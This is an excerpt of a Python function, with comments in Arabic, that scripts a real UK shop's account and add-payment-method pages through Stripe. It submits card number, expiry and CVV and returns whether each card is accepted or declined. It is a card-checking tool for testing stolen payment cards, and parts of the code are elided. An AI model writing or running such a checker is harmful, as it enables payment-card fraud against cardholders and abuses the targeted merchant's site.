...
def Stripe2(ccx):
    """
    فحص بطاقة على guyandbeard.co.uk (Stripe - Auth)
    ccx: رقم|شهر|سنة|cvv
    """
    try:
        # ===== تجزئة البطاقة =====
        ...
        #print("\n[1/6] فتح صفحة الحساب...")
        headers = {
            'authority': 'www.guyandbeard.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': user,
        }
        response = r.get('https://www.guyandbeard.co.uk/my-account/', headers=headers)
        ...
        headers = {
            ...
            'origin': 'https://www.guyandbeard.co.uk',
            'user-agent': user,
        }
        ...
        response = r.post('https://www.guyandbeard.co.uk/my-account/', data=data, headers=headers)
        ...
        response = r.get('https://www.guyandbeard.co.uk/my-account/add-payment-method/', headers=headers)
        #print(f"    ✅ HTTP {response.status_code}")
        ...
        try:
            ...
            if 'id' not in resp_json:
                return f"❌ Stripe Error: {resp_json.get('error', {}).get('message', 'Unknown')}"
        ...
        headers = {
            ...
            'origin': 'https://www.guyandbeard.co.uk',
            'referer': 'https://www.guyandbeard.co.uk/my-account/add-payment-method/',
            'user-agent': user,
        ...
        response = r.post('https://www.guyandbeard.co.uk/wp-admin/admin-ajax.php', data=data, headers=headers)
        text = response.text
        ...
        if '"success":true' in text:
            ...
            try:
                error = response.json().get('data', {}).get('error', {}).get('message', '')
                if error:
                    return f'❌ {error}'
            except:
                pass
